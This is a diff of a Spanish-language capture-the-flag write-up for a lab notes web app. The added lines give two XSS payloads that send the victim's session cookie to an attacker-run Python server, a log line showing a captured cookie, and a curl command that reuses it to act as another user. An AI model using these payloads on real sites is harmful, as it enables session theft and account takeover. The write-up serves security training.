@@ -10,13 +10,24 @@
 
 ### Flag 1 
 
-Creamos un usuario, levantamos un servidor en python con `python -m ` dentro de los upload, en el apartado de texto plano alguno de los siguientes XSS
+Creamos un usuario, levantamos un servidor en python con `python -m http.server 6969` dentro de los upload, en el apartado de texto plano alguno de los siguientes **XSS**
 
 
 ```html
+<!-- esta primera peude buggear la web, reinciadno la VM se arreglar -->
 <img src=x onerror="document.location='http://10.0.2.15:6969/cookie?data='+document.cookie;">
+<!-- segunda opción -->
+<img src=x onerror="fetch('http://10.0.2.15:6969/cookie?data='+document.cookie)">
+```
+
+en nuestro servidor de **Python** vemos esta línea
+
+```shell
+10.0.2.12 - - [17/Mar/2025 23:01:59] "GET /cookie?data=NOTESAPP=29260242|asmith||author HTTP/1.1" 404 -
 
 ```
+y con la cookie ya podemos lanzar un `curl` como la usuaria *Alice Smith* y ver que tiene en su blog
+
 ```shell
                                                                             
 curl -b "NOTESAPP=29260242|asmith||author" http://10.0.2.12/notesapp/
@@ -29,27 +40,6 @@ curl -b "NOTESAPP=29260242|asmith||author" http://10.0.2.12/notesapp/
 <style>
 ...
 ...
-  </span>
-  <span id='menu-right'>
-      
-      <span class='menu-user'>
-        Alice Smith &lt;asmith&gt;
-      </span>
-      
-      | <a href='/notesapp/editprofile.tpl'>Profile</a>
-      | <a href='/notesapp/logout'>Close session</a>
-      
-      
-  </span>
-</div>
-
-<div>
-<h2 class='has-refresh'>Notes: Home</h2>
-<div class='refresh'><a class='button' onclick='_refreshHome("notesapp")' href='#'>Refresh</a></div>
-</div>
-<div class='content'>
-<table width='100%'>
-
   <tr>
     <td></td>
     <td>
@@ -66,65 +56,8 @@ curl -b "NOTESAPP=29260242|asmith||author" http://10.0.2.12/notesapp/
 
   <tr><td colspan='3'><b>Most recent notes:</b></td></tr>
 
+...
 
-
-
-  <tr>
-    <td>
-     
-    </td>
-    <td>
-      <b><span style='color:orange'>Alice Smith</span></b>
-    </td>
-    <td width='100%'><span id='asmith'>Welcome to our shared notes platform!</span>
-    <br>
-          <a href='/notesapp/notes.tpl?uid=asmith'>All notes</a>&nbsp;
-      <a href='#'>Homepage</a>
-    <br>
-    <br>
-    </td>
-  </tr>
-
-
-
-  <tr>
-    <td>
-     
-    </td>
-    <td>
-      <b><span style='color:blue'>John Doe</span></b>
-    </td>
-    <td width='100%'><span id='jdoe'>I'm working on a new project and looking for collaborators!</span>
-    <br>
-          <a href='/notesapp/notes.tpl?uid=jdoe'>All notes</a>&nbsp;
-      <a href='#'>Homepage</a>
-    <br>
-    <br>
-    </td>
-  </tr>
-
-
-
-  <tr>
-    <td>
-     
-    </td>
-    <td>
-      <b><span style='color:red; text-decoration:underline'>Michael Brown</span></b>
-    </td>
-    <td width='100%'><span id='mbrown'>An inspiring quote for the day: "Knowledge grows when shared."Still learning, but happy to share my knowledge!</span>
-    <br>
-          <a href='/notesapp/notes.tpl?uid=mbrown'>All notes</a>&nbsp;
-      <a href='#'>Homepage</a>
-    <br>
-    <br>
-    </td>
-  </tr>
-
-
-</table>
-</div>
-</body>
 </html>
 ```
 
